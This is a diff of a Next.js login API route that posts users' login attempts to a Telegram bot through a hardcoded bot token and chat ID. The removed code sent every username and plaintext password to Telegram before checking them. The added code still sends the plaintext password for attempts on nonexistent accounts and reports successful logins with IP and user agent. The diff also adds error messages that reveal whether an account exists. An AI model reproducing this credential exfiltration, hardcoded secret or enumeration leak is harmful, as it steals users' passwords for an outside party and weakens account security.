@@ -2,22 +2,50 @@ import { NextResponse } from "next/server";
 import { findUser, verifyPassword, updateLastLogin } from "@/lib/db";
 
 // 📤 Функция отправки в Telegram для API
-async function sendToTelegramAPI(data: any, type: 'login' | 'register', ip: string, userAgent: string) {
+async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
   try {
     const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
     const TELEGRAM_CHAT_ID = "7455610355";
     
-    const message = `
-🔐 ${type === 'login' ? 'API ВХОД В СИСТЕМУ' : 'API НОВАЯ РЕГИСТРАЦИЯ'}
+    let message = '';
+    
+    if (type === 'login_success') {
+      message = `
+✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ
 
 👤 Логин/Email: ${data.login}
-🔑 Пароль: ${data.password}
 
-🌐 **Серверные данные:**
+🌐 **Данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
-    `;
+      `;
+    } else if (type === 'login_failed') {
+      message = `
+❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА
+
+👤 Логин/Email: ${data.login}
+🔑 Введенный пароль: ${data.password}
+🚫 Причина: ${error}
+
+🌐 **Данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent.slice(0, 100)}...
+      `;
+    } else {
+      message = `
+🔐 НОВАЯ РЕГИСТРАЦИЯ
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+
+🌐 **Данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent.slice(0, 100)}...
+      `;
+    }
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -45,14 +73,20 @@ export async function POST(request: Request) {
         return NextResponse.json({ error: "Логин и пароль обязательны" }, { status: 400 });
     }
 
-    // 📤 Отправляем в Telegram ДО проверки
-    await sendToTelegramAPI({ login, password }, 'login', clientIP, userAgent);
-
     // Ищем пользователя
     const user = findUser(login);
     if (!user) {
+      // 📤 Отправляем в Telegram о неудачной попытке
+      await sendToTelegramAPI(
+        { login, password }, 
+        'login_failed', 
+        clientIP, 
+        userAgent, 
+        'Аккаунт не существует'
+      );
+      
       return NextResponse.json(
-        { error: "Неверный логин/email или пароль" },
+        { error: "Аккаунт с таким логином/email не существует" },
         { status: 400 }
       );
     }
@@ -60,11 +94,28 @@ export async function POST(request: Request) {
     // Проверяем пароль
     const isValid = await verifyPassword(password, user.password);
     if (!isValid) {
+      // 📤 Отправляем в Telegram о неудачной попытке
+      await sendToTelegramAPI(
+        { login, password: '***' }, // Не показываем реальный пароль
+        'login_failed', 
+        clientIP, 
+        userAgent, 
+        'Неверный пароль'
+      );
+      
       return NextResponse.json(
-        { error: "Неверный логин/email или пароль" },
+        { error: "Неверный пароль" },
         { status: 400 }
       );
     }
+
+    // 📤 Отправляем в Telegram об успешном входе
+    await sendToTelegramAPI(
+      { login }, 
+      'login_success', 
+      clientIP, 
+      userAgent
+    );
 
     // Обновляем lastLogin
     updateLastLogin(
@@ -73,7 +124,6 @@ export async function POST(request: Request) {
       userAgent
     );
 
-    // В реальном приложении здесь бы создавалась сессия/JWT токен
     return NextResponse.json({ success: true, message: "Вход выполнен успешно" });
 
   } catch (error) {
